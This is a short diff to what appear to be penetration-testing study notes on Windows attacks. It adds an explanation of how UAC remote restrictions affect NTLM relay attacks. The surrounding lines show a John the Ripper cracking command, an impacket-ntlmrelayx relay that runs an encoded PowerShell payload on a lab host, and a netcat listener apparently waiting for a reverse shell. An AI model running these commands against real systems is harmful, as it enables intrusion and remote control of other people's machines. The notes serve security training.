@@ -154,6 +154,8 @@ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 > This is used when the user in files01 is an unprivileged user but is an local administrator account on files02
 
 > Windows UAC will restrict any user accounts behaviour remotely other than the local administrator
+
+>In this example we don't use the local Administrator user for the relay attack as we did for the pass-the-hash attack. Therefore, the target system needs to have UAC remote restrictions disabled or the command execution will fail. If UAC remote restrictions are enabled on the target then we can only use the local Administrator user for the relay attack. 
 ```
 kali: impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA...(UTF-16LE base64 encoded payload)"
 kali: nc -nvlp 8080
